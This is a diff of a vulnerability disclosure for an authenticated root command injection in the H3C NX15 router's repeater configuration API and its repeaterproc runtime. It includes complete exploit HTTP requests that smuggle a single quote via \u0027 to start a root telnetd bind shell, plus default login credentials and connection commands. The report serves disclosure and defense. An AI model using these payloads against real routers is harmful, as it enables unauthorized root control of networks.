@@ -1,10 +1,12 @@
-# H3C NX15 R017 `esps.wan.repeater.set` -> `repeaterproc` Conditional Authenticated Root Command Injection
+# H3C NX15 R017 Authenticated Root Command Injection via `esps.wan.repeater.set` and `repeaterproc`
 
 ## Summary
 
-H3C NX15 Router firmware NX15V100R017 contains an authenticated command injection vulnerability in the `/api/esps` RPC object `esps.wan.repeater`, method `set`. Attacker-controlled `my2P4key` data is written into `/tmp/config/repeater_status` and later consumed by the `repeaterproc` runtime when the 2.4G repeater initialization path runs. In that path, the value is inserted into a shell-constructed `ubus call esps.system changepasswd '{"newPass":"%s"}'` command template and executed through `mw_system()`, allowing a remote authenticated administrator to execute arbitrary commands as root.
+H3C NX15 Router firmware NX15V100R017 contains an authenticated command injection vulnerability in the `/api/esps` RPC object `esps.wan.repeater`, method `set`. Attacker-controlled `my2P4key` data is written into `/tmp/config/repeater_status` and later consumed by the `repeaterproc` runtime during the 2.4G repeater initialization path. In that path, the value is embedded into a shell-constructed `ubus call esps.system changepasswd '{"newPass":"%s"}'` command template and executed through `system_wrapper()`, allowing a remote authenticated administrator to execute arbitrary commands as root.
 
-The issue is conditional rather than immediate. Exploitation requires the repeater state machine to enter the associated 2.4G initialization branch. However, the root cause is still a concrete shell command injection in product-specific backend logic, and runtime validation confirmed both marker-file execution and a spawned root shell.
+The issue is conditional rather than immediate. Exploitation requires the repeater state machine to enter the associated 2.4G initialization branch. Nevertheless, the root cause is a concrete shell command injection in product-specific backend logic, and runtime validation confirmed both marker-file execution and a spawned root shell on real hardware.
+
+During the verified real-world reproduction, the initial exploit request was sent to the default management address `192.168.8.1`, but after the router successfully switched into repeater mode, the device management plane moved to a new upstream DHCP-assigned address. In the confirmed exploit run documented here, the H3C router became reachable at `192.168.10.134`, and the injected root shell was reachable at `telnet 192.168.10.134 2461`.
 
 ## Vendor and Product
 
@@ -34,6 +36,7 @@ An authenticated attacker can execute arbitrary commands as root once the router
 - Writing attacker-controlled marker files as root.
 - Starting a root shell service.
 - Connecting to the spawned service and executing commands with UID 0.
+- Forcing the router into repeater/bridge mode so that the management IP moves away from the factory-default address and is reassigned from the upstream network.
 
 The issue also has a configuration side effect: the injected `my2P4key` value is written into `wireless.2gssid1.key` before the shell sink is reached, so successful exploitation contaminates the 2.4G AP key with the payload string.
 
@@ -70,7 +73,13 @@ When `workMode=repeater`, the backend handler stores repeater-related fields inc
 
 into `/tmp/config/repeater_status`.
 
-The top-level request filtering is insufficient. A raw single quote can be smuggled through the HTTP JSON body by using the Unicode escape sequence `\u0027`. After JSON decoding, the real single quote is preserved in the stored repeater configuration and reaches later runtime logic.
+The top-level request filtering is insufficient. A raw single quote can be smuggled through the HTTP JSON body by using the Unicode escape sequence `\u0027`. In the confirmed exploit request, the payload-bearing field was:
+
+```json
+"my2P4key":"x\u0027;telnetd -p2461 -l /bin/sh >/tmp/rp 2>&1;#"
+```
+
+After JSON decoding, the real single quote is preserved in the stored repeater configuration and reaches later runtime logic.
 
 ### Stage 2: Key whitelist checks can be skipped
 
@@ -79,11 +88,12 @@ The backend includes logic intended to validate repeater keys. However, that che
 - `periorradio == "2.4G"`
 - `my2P4ssid == perior_ssid`
 
+![alt text](imag/image-13.png)
 Under those conditions, the code path clears the validation requirement and allows the attacker-controlled `my2P4key` value to continue without the expected whitelist enforcement.
 
 ### Stage 3: `repeaterproc` reloads the stored value
 
-Reverse analysis confirmed that `repeaterproc` reads `/tmp/config/repeater_status` through `Repeater_GetMyparam()`. The relevant internal layout places:
+Reverse analysis confirmed that `repeaterproc` reads `/tmp/config/repeater_status` through `LoadLocalRepeaterApConfig()`. The relevant internal layout places:
 
 - `my2P4ssid` at `a1 + 0`
 - `my2P4key` at `a1 + 48`
@@ -98,22 +108,33 @@ This issue is not a direct "send once, execute immediately" injection. The vulne
 
 Runtime analysis showed that the branch depends on conditions such as:
 
-- `Judge_Repeater_Enable()` selecting the initialization path rather than the already-enabled monitoring path.
+- `LoadEnabledRepeaterUplinkConfig()` selecting the initialization path rather than the already-enabled monitoring path.
 - `/tmp/config/connected` indicating link readiness.
-- `Repeater_get_vap_status()` treating `wlan1-vxd` as associated.
+- `SampleRepeaterUplinkRuntimeStatus()` treating `wlan1-vxd` as associated.
 - A positive RSSI and `online_time >= 6` being observed in the associated status data.
 
-On a real deployment, these conditions can be satisfied when the router genuinely attempts to associate to an attacker-controlled or attacker-influenced upstream AP. On a single-router bench, these conditions can be emulated to validate the sink without changing the root cause.
+![alt text](imag/image-14.png)
+On a real deployment, these conditions can be satisfied when the router genuinely attempts to associate to an attacker-controlled or attacker-influenced upstream AP. This was confirmed during testing with a real 2.4G upstream AP using:
+
+- SSID: `same-ssid`
+- passphrase: `upstreampass`
+- security mode: `WPA2-PSK`
+
+Once association succeeds, `ApplyRepeaterNetworkMode()` moves `network.lan1` into DHCP-backed repeater/bridge mode. As a result, the management plane no longer reliably remains at the original address `192.168.8.1` and must be rediscovered on the upstream network. In the verified exploit run documented here, the router obtained `192.168.10.134` from the upstream DHCP server.
+
+![alt text](imag/image-15.png)
+
+On a single-router bench, these conditions can also be emulated to validate the sink without changing the root cause.
 
 ### Stage 5: Root command injection sink
 
-In `Repeater_SetMyparam()`, `my2P4key` is first written into the wireless configuration and is then used to build a shell command when `system.system.password_consistent_switch == 1`:
+In `ApplyLocalRepeaterApConfig()`, `my2P4key` is first written into the wireless configuration and is then used to build a shell command when `system.system.password_consistent_switch == 1`:
 
 ```c
 snprintf(buf, ..., "ubus call esps.system changepasswd '{\"newPass\":\"%s\"}'", key);
-mw_system(buf);
+system_wrapper(buf);
 ```
-
+![alt text](imag/image-12.png)
 The test device was configured with:
 
 ```text
@@ -126,11 +147,11 @@ so the sink was reachable. Once `my2P4key` contains a real single quote, the att
 x';telnetd -p2461 -l /bin/sh >/tmp/rp 2>&1;#
 ```
 
-turns the intended `ubus call ...` template into a shell breakout that executes attacker-controlled commands as root.
+turns the intended `ubus call ...` template into a shell breakout that executes attacker-controlled commands as root. In the real HTTP exploit request, that single quote was introduced as `\u0027` inside the JSON body, while the later shell sink consumed it as a real `'`.
 
 ### Why this is a distinct CVE candidate
 
-This issue is not another raw ubus exposure like `file.exec` or `service.add`, and it is not direct `reload.reload_config` parameter injection. It is a product-specific command injection in the repeater runtime that is reached by authenticated configuration input and later triggered by the device's own repeater state machine.
+This issue is distinct from the other authenticated RPC issues in this firmware line. It is neither a raw ubus execution surface such as `file.exec` / `service.add`, nor a direct `reload.reload_config` parameter injection. Instead, it is a product-specific command injection in the repeater runtime that is reached by authenticated configuration input and later triggered by the device's own repeater state machine.
 
 ## Firmware Paths for Audit
 
@@ -180,12 +201,21 @@ Expected result:
 uid=0(root)
 ```
 
+Operational note:
+
+- The exploit request is initially sent to the pre-repeater management address, typically `http://192.168.8.1`.
+- After the repeater transition succeeds, the router may move onto the upstream network and receive a new DHCP-assigned management address.
+- In the verified run documented here, the post-transition address was `192.168.10.134`, and the root shell listener was reachable at `telnet 192.168.10.134 2461`.
+
 Manual request sequence:
 
 1. Authenticate through `POST /api/login/auth` and capture the `session`.
 2. Prepare either:
    - a real repeater environment where the router will enter the associated 2.4G repeater path, or
    - a lab-assisted state equivalent to the one automated by the PoC.
+
+![alt text](imag/image.png)
+
 3. Send a raw request to `/api/esps` so the `\u0027` sequence is preserved exactly:
 
 ```http
@@ -194,11 +224,22 @@ Host: 192.168.8.1
 Content-Type: application/json
 AUTHENTICATION: <session>
 
-[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"psk2+ccmp","my2P4ssid":"same-ssid","my2P4key":"x\u0027;telnetd -p2461 -l /bin/sh >/tmp/rp 2>&1;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","status":"enable","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
+[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"wpa2psk","my2P4ssid":"same-ssid","my2P4key":"x\u0027;telnetd -p2461 -l /bin/sh >/tmp/rp 2>&1;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","status":"enable","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
 ```
 
 4. Wait for the repeater runtime to process the stored configuration.
-5. Connect to `telnet 192.168.8.1 2461` and run `id`.
+
+![alt text](imag/image-1.png)
+
+![alt text](imag/image-3.png)
+5. After the router successfully enters repeater mode, rediscover the device on the upstream network because the management IP may have changed from `192.168.8.1` to a DHCP-assigned upstream address.
+6. Connect to `telnet <new-router-ip> 2461` and run `id`.
+
+In the verified exploit run for this report, the new router address was:
+
+```text
+192.168.10.134
+```
 
 Marker-file validation request:
 
@@ -208,7 +249,7 @@ Host: 192.168.8.1
 Content-Type: application/json
 AUTHENTICATION: <session>
 
-[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"psk2+ccmp","my2P4ssid":"same-ssid","my2P4key":"x\u0027;echo REPEATER_KEY_OK >/tmp/repeater_key_marker;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","status":"enable","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
+[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"wpa2psk","my2P4ssid":"same-ssid","my2P4key":"x\u0027;echo REPEATER_KEY_OK >/tmp/repeater_key_marker;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","status":"enable","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
 ```
 
 BurpSuite step-by-step reproduction:
@@ -226,6 +267,8 @@ Connection: close
 {"username":"admin","password":"admin123"}
 ```
 
+![alt text](imag/image-5.png)
+
 2. Extract `data.session`.
 3. Ensure the test environment is ready to make `repeaterproc` enter the associated 2.4G repeater branch.
 4. Send the raw `/api/esps` request with the `\u0027` payload:
@@ -236,22 +279,27 @@ Host: 192.168.8.1
 User-Agent: Mozilla/5.0
 Accept: application/json, text/plain, */*
 Content-Type: application/json
-AUTHENTICATION: <SESSION>
+AUTHENTICATION: <session>
 Connection: close
 
-[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"psk2+ccmp","my2P4ssid":"same-ssid","my2P4key":"x\u0027;telnetd -p2461 -l /bin/sh >/tmp/rp 2>&1;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","status":"enable","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
+[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","status":"enable","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"wpa2psk","my2P4ssid":"same-ssid","my2P4key":"x\u0027;telnetd -p2461 -l /bin/sh >/tmp/rp 2>&1;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
 ```
-
+![alt text](imag/image-6.png)
 5. Wait briefly and connect:
 
+
+![alt text](imag/image-7.png)
+
 ```bash
-telnet 192.168.8.1 2461
+telnet 192.168.10.134 2461
 ```
+
+The address `192.168.10.134` is the verified post-repeater DHCP address observed in the confirmed exploit run. Testers should not assume the device will remain reachable at `192.168.8.1` after the repeater transition succeeds; instead, they should rediscover the router on the upstream subnet by checking the upstream DHCP client table, ARP cache, or host discovery results.
 
 or:
 
 ```bash
-nc 192.168.8.1 2461
+nc 192.168.10.134 2461
 ```
 
 6. Run:
@@ -260,7 +308,7 @@ nc 192.168.8.1 2461
 id
 uname -a
 ```
-
+![alt text](imag/image-4.png)
 Expected result:
 
 ```text
@@ -275,8 +323,8 @@ Note on payload length:
 
 - Raw `/api/esps` requests can store a real single quote in `my2P4key` by using `\u0027` in the JSON body.
 - The backend can skip repeater key validation when the attacker chooses the 2.4G path with `my2P4ssid == perior_ssid`.
-- Reverse analysis confirmed that `Repeater_GetMyparam()` maps `my2P4key` into the structure later consumed by `Repeater_SetMyparam()`.
-- Reverse analysis confirmed that `Repeater_SetMyparam()` builds `ubus call esps.system changepasswd '{"newPass":"%s"}'` and executes it through `mw_system()` when `password_consistent_switch == 1`.
+- Reverse analysis confirmed that `LoadLocalRepeaterApConfig()` maps `my2P4key` into the structure later consumed by `ApplyLocalRepeaterApConfig()`.
+- Reverse analysis confirmed that `ApplyLocalRepeaterApConfig()` builds `ubus call esps.system changepasswd '{"newPass":"%s"}'` and executes it through `system_wrapper()` when `password_consistent_switch == 1`.
 - Runtime testing confirmed:
   - marker file creation at `/tmp/repeater_key_marker`,
   - contamination of `wireless.2gssid1.key` with the payload string,
@@ -285,7 +333,6 @@ Note on payload length:
 ## Attachments
 
 - Report: `report/postauth_esps_wan_repeater_repeaterproc_rce_report.md`
-- Analysis guidance: `report/postauth_esps_wan_repeater_repeaterproc_rce_analysis_guidance.md`
 - PoC: `poc/postauth_esps_wan_repeater_repeaterproc_rce.py`
 
 ## Remediation
